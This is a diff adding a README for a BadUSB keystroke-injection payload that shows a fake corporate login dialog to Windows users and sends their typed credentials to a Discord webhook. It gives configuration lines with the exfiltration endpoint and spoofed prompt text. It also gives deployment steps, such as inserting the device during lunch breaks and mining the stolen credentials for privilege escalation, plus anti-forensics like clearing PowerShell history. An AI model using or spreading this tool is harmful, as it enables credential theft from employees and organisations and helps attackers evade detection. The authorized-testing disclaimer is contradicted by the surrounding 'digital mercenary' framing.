@@ -1,0 +1,147 @@
+HexMod Corporate Credential Harvester
+Digital Identity Liberation Tool
+
+This tool is designed for authorized penetration testing and security awareness training only. Unauthorized credential harvesting violates multiple federal laws and corporate policies. Use only with explicit written authorization from target organizations.
+Disclaimer: This tool demonstrates the effectiveness of credential harvesting attacks as documented in real-world incidents affecting major corporations. Use responsibly to strengthen organizational security, not to compromise it.
+
+These payloads represent the cutting edge of corporate identity warfare - a sophisticated credential harvesting system designed to expose the fragility of corporate authentication theater. When megacorps think their login portals are secure, we remind them that human psychology remains the weakest link in their digital fortress.
+
+The Corporate Credential Harvester deploys advanced social engineering protocols through convincing authentication dialogs that mirror legitimate corporate systems. Perfect for red team operations where you need to demonstrate how easily employees can be manipulated into surrendering their digital identities.
+
+Operational Specifications
+Target Systems: Windows 10/11 corporate workstations
+
+Deployment Vector: USB Rubber Ducky, Flipper Zero, or compatible keystroke injection device
+
+Execution Time: ~20-45 seconds depending on user interaction
+
+Stealth Rating: Maximum (mimics legitimate authentication prompts)
+
+Corporate Security Theater Exposure: Complete
+
+Arsenal Requirements
+Hardware
+BadUSB device (USB Rubber Ducky recommended for corporate infiltration)
+
+Target Windows system with GUI access
+
+Steady nerves for psychological warfare deployment
+
+Infrastructure
+Discord Webhook or custom HTTP endpoint for credential exfiltration
+
+SSL/TLS encryption for secure data transmission
+
+Log aggregation system for harvested credential analysis
+
+Backup exfiltration channels in case primary endpoints are blocked
+
+Configuration Protocols
+text
+REM ===== PSYCHOLOGICAL WARFARE PARAMETERS =====
+DEFINE #WEBHOOK_URL https://discord.com/api/webhooks/example/endpoint
+DEFINE #PROMPT_TITLE "Corporate Network Authentication Required"
+DEFINE #PROMPT_MESSAGE "Your session has expired. Please re-enter credentials."
+DEFINE #INITIAL_DELAY 3000
+DEFINE #EXECUTION_DELAY 500
+DEFINE #STEALTH_DELAY 2000
+Required Modifications
+Replace #WEBHOOK_URL with your actual data exfiltration endpoint
+
+Customize #PROMPT_TITLE to match target organization branding
+
+Adjust #PROMPT_MESSAGE for maximum social engineering effectiveness
+
+Fine-tune timing delays based on target system performance
+
+Deployment Instructions
+Reconnaissance - Study target organization's authentication systems and branding
+
+Compile the payload in Payload Studio with organization-specific modifications
+
+Flash the compiled binary to your BadUSB device
+
+Insert device during optimal infiltration window (lunch breaks, meetings, etc.)
+
+Monitor webhook endpoint for harvested credentials
+
+Extract device after successful credential capture
+
+Analyze harvested data for privilege escalation opportunities
+
+Technical Architecture
+The payload employs multi-stage psychological manipulation:
+
+Stage 1: Environmental Preparation
+Hidden PowerShell deployment for stealth execution
+
+System reconnaissance to ensure optimal timing
+
+GUI framework initialization for authentic dialog rendering
+
+Stage 2: Social Engineering Interface
+Windows Forms deployment mimicking corporate authentication
+
+Branded dialog boxes with customizable titles and messages
+
+Password masking to maintain authenticity illusion
+
+Input validation to ensure credential quality
+
+Stage 3: Data Exfiltration
+JSON payload construction with system metadata
+
+Encrypted transmission to configured webhook endpoint
+
+Error handling for network connectivity issues
+
+Silent failure modes to avoid user suspicion
+
+Stage 4: Evidence Elimination
+PowerShell history clearing for anti-forensics
+
+Temporary file cleanup to minimize detection footprint
+
+Process termination without system alerts
+
+Advanced Evasion Techniques
+Behavioral Mimicry
+The harvester employs legitimate Windows authentication patterns:
+
+Standard dialog box dimensions and styling
+
+Corporate-appropriate color schemes and fonts
+
+Realistic error handling and user feedback
+
+Authentic keyboard navigation support
+
+Anti-Detection Protocols
+Hidden execution windows to avoid visual detection
+
+Legitimate process impersonation through PowerShell
+
+Network traffic obfuscation via HTTPS encryption
+
+Timing randomization to avoid behavioral analysis
+
+Operational Security Considerations
+
+Support Channels
+Issues: Report through encrypted communication channels only
+
+Enhancements: Submit modifications via secure code repositories
+
+Training: Consult HexMod digital mercenary operations manual
+
+Remember: In the corporate wasteland, credentials are the keys to the kingdom. This tool exposes how easily those keys can be stolen through psychological manipulation rather than technical exploitation.
+
+The megacorps think their employees are their greatest asset. We're here to prove they're actually their greatest vulnerability.
+
+#DigitalMercenary #AntiCorp #CredentialHarvesting #HexModRebellion
+
+Stay ghosted. Stay dangerous. The revolution will be digitized.
+
+Disclaimer: This tool demonstrates the effectiveness of credential harvesting attacks as documented in real-world incidents affecting major corporations. Use responsibly to strengthen organizational security, not to compromise it.
+
+
